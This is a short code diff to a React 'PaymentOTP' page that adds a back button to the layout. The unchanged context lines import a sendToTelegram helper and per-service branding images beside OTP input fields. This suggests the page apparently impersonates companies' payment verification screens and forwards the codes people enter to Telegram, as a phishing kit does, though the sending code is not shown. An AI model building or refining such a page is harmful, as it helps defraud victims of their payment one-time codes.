@@ -9,6 +9,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import BackButton from "@/components/BackButton";
 import {
   InputOTP,
   InputOTPGroup,
@@ -208,6 +209,10 @@ const PaymentOTP = () => {
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
+        <div className="mb-4">
+          <BackButton />
+        </div>
+        
         <div className="max-w-md mx-auto">
           {/* Company Header Image */}
           {branding.ogImage && (
